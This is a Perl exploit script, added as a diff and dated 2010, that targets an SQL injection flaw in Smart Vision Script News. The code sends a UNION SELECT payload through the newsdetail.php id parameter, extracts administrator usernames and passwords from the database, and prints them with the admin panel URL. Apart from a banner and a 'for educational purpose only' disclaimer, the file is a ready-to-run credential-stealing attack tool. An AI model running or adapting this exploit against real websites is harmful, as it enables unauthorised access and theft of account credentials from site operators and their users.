@@ -1,0 +1,124 @@
+#!usr/bin/perl 
+############################################################################
+# Exploit Title: Smart Vision Script News (newsdetail) SQL Injection Exploit
+# Date: 01-04-2010
+# Author: darkmasking
+############################################################################
+# This was written for educational purpose only. Use it at your own risk. 
+# Author will be not responsible for any damage! 
+############################################################################ 
+# Vuln discovered by Err0R 
+# Smart Vision Script News ( newsdetail ) SQL Injection Vulnerability
+# http://www.exploit-db.com/exploits/10977
+############################################################################
+# Greetz : sorry bro lom ada teman jadi tuk diri sendiri aja 0_o
+############################################################################
+ 
+  use IO::Socket::INET; 
+  use LWP::UserAgent; 
+ 
+  sub banner { 
+ 
+  print "\n". 
+              "[»]=============================================[_][-][X]\n". 
+	      "[»]  =======   ------d-------m------   ====    ====   [»]\n". 
+	      "[»]  || === =       | |(o o)| |        ||== || ==||   [»]\n". 
+	      "[»]  || === =         ||(~)||          || =    = ||   [»]\n". 
+	      "[»]  =======             |             ||        ||   [»]\n". 
+	      "[»]---------------------------------------------------[»]\n". 
+              "[»] Smart Vision Script News (newsdetail)             [»]\n". 
+              "[»] SQL Injection Exploit                             [»]\n". 
+              "[»] by darkmasking                                    [»]\n". 
+              "[»] Vuln discovered by Err0R                          [»]\n". 
+              "[»]===================================================[»]\n\n"; 
+ } 
+ 
+ my $host    = $ARGV[0]; 
+ my $sql_path = "/newsdetail.php?id="; 
+ my $admin_path ="/admin/admin.php"; 
+ 
+ if (@ARGV < 1) { 
+    &banner(); 
+    &help("-1"); 
+ } 
+ 
+ elsif(check($host) == 1) { 
+	&banner(); 
+	&dmploit($host,$sql_path); 
+ } 
+ 
+ else { 
+    &banner(); 
+    help("-2"); 
+ } 
+ 
+ sub dmploit() { 
+ 
+    my $host     = $_[0]; 
+    my $sql_path = $_[1]; 
+ 
+    print "[+] Getting Username and Password\n"; 
+    print "[!] Checking...\n"; 
+    print "\n"; 
+ 
+	my $sql_atk = $host.$sql_path."-9999 union select null,concat(0x6461726b6d61736b696e67,0x3a,user_name,0x3a,password,0x3a,0x6461726b6d61736b696e67),null,null,null,null,null from zagrosle_zagros.user_accounts--";
+	my $sql_get = get_url($sql_atk); 
+    my $connect = tag($sql_get); 
+ 
+    if($connect =~ /darkmasking:(.+):(.+):darkmasking/) { 
+ 
+    print "-o0 SQL Injection Successfully 0o-\n"; 
+    print "[+] Username : $1\n"; 
+    print "[+] Password : $2\n"; 
+    print "\n"; 
+    print "[+] Admin URL = $host$admin_path\n"; 
+ 
+    } 
+ 
+    else { 
+	print "[-] SQL Injection Failed\n"; 
+    } 
+ } 
+ 
+   sub get_url() { 
+    $link = $_[0]; 
+    my $req = HTTP::Request->new(GET => $link); 
+    my $ua = LWP::UserAgent->new(); 
+    $ua->timeout(5); 
+    my $response = $ua->request($req); 
+    return $response->content; 
+  } 
+ 
+  sub tag() { 
+    my $string = $_[0]; 
+    $string =~ s/ /\$/g; 
+    $string =~ s/\s/\*/g; 
+    return($string); 
+  } 
+ 
+  sub check() { 
+  my $host  = $_[0]; 
+  if ($host =~ /http:\/\/(.*)/) { 
+    return 1; 
+    } 
+    else { 
+    return 0; 
+    } 
+  } 
+ 
+  sub help() { 
+ 
+  my $error = $_[0]; 
+  if ($error == -1) { 
+  print "\n[-] Error, missed some arguments !\n\n"; 
+  } 
+ 
+  elsif ($error == -2) { 
+ 
+    print "\n[-] Error, Bad arguments !\n"; 
+    } 
+ 
+    print " Usage : perl $0 http://www.darkurl.com/\n\n"; 
+    print " Ex    : perl $0 http://www.darkurl.com/\n\n"; 
+    exit(0); 
+  }
